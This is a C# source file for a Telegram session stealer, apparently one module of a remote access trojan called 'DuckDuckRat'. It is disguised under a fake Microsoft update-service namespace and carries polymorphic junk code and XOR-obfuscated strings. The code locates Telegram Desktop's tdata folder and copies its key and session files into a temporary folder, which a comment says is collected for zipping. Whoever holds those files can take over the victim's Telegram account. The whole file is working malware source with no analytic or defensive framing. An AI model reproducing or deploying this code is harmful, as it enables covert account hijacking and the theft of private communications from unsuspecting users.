using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;

namespace Microsoft.UpdateService.Modules
{
    public class MessengerService
    {
        // [POLY_JUNK]
        private static void _DuckDuckRat_d484e444() {
            int val = 92020;
            if (val > 50000) Console.WriteLine("Hash:" + 92020);
        }

        private static string D(string s)
        {
            char[] c = s.ToCharArray();
            for (int i = 0; i < c.Length; i++) c[i] = (char)(c[i] ^ 0x05);
            return new string(c);
        }

        private readonly string _appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        public string Run()
        {
            try
            {
                string tdataPath = Path.Combine(_appData, D("Q`i`bwdh%A`vnqju"), D("qadqd")); // Telegram Desktop, tdata
                if (!Directory.Exists(tdataPath)) return "❌ Telegram Desktop not found.";

                string sessionDir = Path.Combine(Path.GetTempPath(), "TG_" + Guid.NewGuid().ToString().Substring(0, 8));
                Directory.CreateDirectory(sessionDir);

                // Core session files patterns
                string[] includePatterns = { "D877*", "map*", "key_data*", "settings*" };
                
                int count = 0;
                foreach (var pattern in includePatterns)
                {
                    foreach (var file in Directory.GetFiles(tdataPath, pattern))
                    {
                        try
                        {
                            string dest = Path.Combine(sessionDir, Path.GetFileName(file));
                            File.Copy(file, dest, true);
                            count++;
                        }
                        catch { }
                    }
                }

                // Also copy subfolders that look like sessions (e.g. D877...)
                foreach (var dir in Directory.GetDirectories(tdataPath))
                {
                    string dirName = Path.GetFileName(dir);
                    if (dirName.Length > 15 || dirName.StartsWith("D877"))
                    {
                        try
                        {
                            string destDir = Path.Combine(sessionDir, dirName);
                            Directory.CreateDirectory(destDir);
                            foreach (var file in Directory.GetFiles(dir))
                            {
                                File.Copy(file, Path.Combine(destDir, Path.GetFileName(file)), true);
                            }
                            count++;
                        }
                        catch { }
                    }
                }

                if (count == 0) return "❌ No Telegram sessions found.";

                return sessionDir; // Return path to the collected session for zipping
            }
            catch (Exception ex)
            {
                return $"❌ Telegram error: {ex.Message}";
            }
        }
    }
}


